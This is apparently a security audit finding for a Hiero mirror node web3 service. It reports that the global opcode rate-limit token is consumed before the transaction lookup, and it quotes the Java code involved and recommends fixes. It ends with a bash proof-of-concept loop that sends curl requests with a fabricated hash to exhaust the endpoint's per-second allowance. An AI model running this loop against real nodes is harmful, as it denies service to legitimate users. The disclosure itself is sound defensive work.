### Title
Global Opcode Rate-Limit Token Consumed Before Transaction Existence Check, Enabling Unauthenticated DoS

### Summary
`OpcodesController.getContractOpcodes()` unconditionally consumes the single global `opcodeRateLimitBucket` token (default 1 RPS) at line 61 **before** `OpcodeServiceImpl` performs any database lookup to verify the transaction exists. Because there is no token-restoration path for the opcode bucket on a 404, any unauthenticated caller can exhaust the entire per-second allowance with a syntactically valid but non-existent hash, blocking every legitimate opcode trace request for that second.

### Finding Description

**Exact code path:**

`OpcodesController.getContractOpcodes()` — `web3/src/main/java/org/hiero/mirror/web3/controller/OpcodesController.java`, lines 59–64:

```java
if (properties.isEnabled()) {
    validateAcceptEncodingHeader(acceptEncoding);   // line 60 – trivially satisfied
    throttleManager.throttleOpcodeRequest();        // line 61 – token consumed HERE
    final var request = new OpcodeRequest(transactionIdOrHash, stack, memory, storage);
    return opcodeService.processOpcodeCall(request); // line 64 – DB lookup happens here
}
```

`ThrottleManagerImpl.throttleOpcodeRequest()` — `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, lines 52–56:

```java
public void throttleOpcodeRequest() {
    if (!opcodeRateLimitBucket.tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
}
```

`OpcodeServiceImpl.buildCallServiceParameters()` — `web3/src/main/java/org/hiero/mirror/web3/service/OpcodeServiceImpl.java`, lines 83–87:

```java
case TransactionHashParameter transactionHash -> {
    ContractTransactionHash contractTransactionHash = contractTransactionHashRepository
            .findByHash(transactionHash.hash().toArray())
            .orElseThrow(() ->
                    new EntityNotFoundException("Contract transaction hash not found: " + transactionHash));
```

**Root cause:** The token is deducted from `opcodeRateLimitBucket` before the service layer validates that the referenced transaction actually exists. `ThrottleManager.restore(long gas)` only refunds `gasLimitBucket` tokens; there is no equivalent restore path for `opcodeRateLimitBucket`. The bucket is a single global Spring bean (no per-IP partitioning), so one attacker request exhausts the allowance for all callers.

**Why existing checks fail:**

- `validateAcceptEncodingHeader` (line 60) fires *before* the throttle and rejects requests missing `gzip`, but an attacker trivially adds `Accept-Encoding: gzip`.
- `TransactionHashParameter.valueOf()` (pattern `^(0x)?([0-9A-Fa-f]{64})$`) validates only *format*, not existence. A 32-byte all-zero or random hex string passes cleanly and reaches the throttle gate.
- Format-invalid strings (e.g., wrong length) are rejected at `@PathVariable` binding with HTTP 400 *before* the throttle, but this does not help because valid-format fabricated hashes are trivially constructable.
- `ThrottleManager.restore()` is called only from `ContractCallService.restoreGasToBucket()` for the gas bucket; it is never called after an opcode 404.

### Impact Explanation

With the default `opcodeRequestsPerSecond = 1`, a single attacker request per second with a fabricated hash permanently occupies the entire opcode trace capacity for that second. All legitimate callers receive HTTP 429 for the remainder of that second. Because the bucket refills greedily at 1 token/second, the attacker needs only a 1 req/s loop to sustain a complete denial of the opcode trace endpoint indefinitely. No account, API key, or privileged access is required.

### Likelihood Explanation

The attack requires zero privileges: no authentication, no on-chain account, no special knowledge beyond the public API schema. The endpoint URL and hash format are documented in the OpenAPI spec. A single HTTP client with a `while(true)` loop sending one request per second is sufficient. The attack is trivially repeatable, cheap (no EVM execution occurs on the attacker's side), and leaves no meaningful forensic trail beyond access logs.

### Recommendation

1. **Move `throttleOpcodeRequest()` after transaction existence is confirmed**, or
2. **Add a `restoreOpcodeToken()` method** to `ThrottleManager`/`ThrottleManagerImpl` that calls `opcodeRateLimitBucket.addTokens(1)` and invoke it in the controller's exception handler when a 404 is returned, or
3. **Implement per-source-IP rate limiting** (e.g., via a `ConcurrentHashMap<String, Bucket>` keyed on client IP) so one attacker cannot exhaust the global budget, or
4. **Combine (1) and (3)**: validate existence first (cheap DB lookup), then consume the token only for requests that will actually trigger EVM re-execution.

### Proof of Concept

```bash
# Requires: curl, bash
# Fabricated valid-format 32-byte hash that does not exist on-chain
FAKE_HASH="0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
ENDPOINT="http://<mirror-node-web3-host>/api/v1/contracts/results/${FAKE_HASH}/opcodes"

# Step 1: Attacker loop – 1 req/s is enough to hold the token
while true; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Accept-Encoding: gzip" \
    "$ENDPOINT"
  sleep 0.9
done
# Expected: 404 (token consumed, transaction not found)

# Step 2: Legitimate user – in a separate terminal
REAL_HASH="0x<valid_existing_transaction_hash>"
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Accept-Encoding: gzip" \
  "http://<mirror-node-web3-host>/api/v1/contracts/results/${REAL_HASH}/opcodes"
# Expected: 429 Too Many Requests (token already consumed by attacker)
```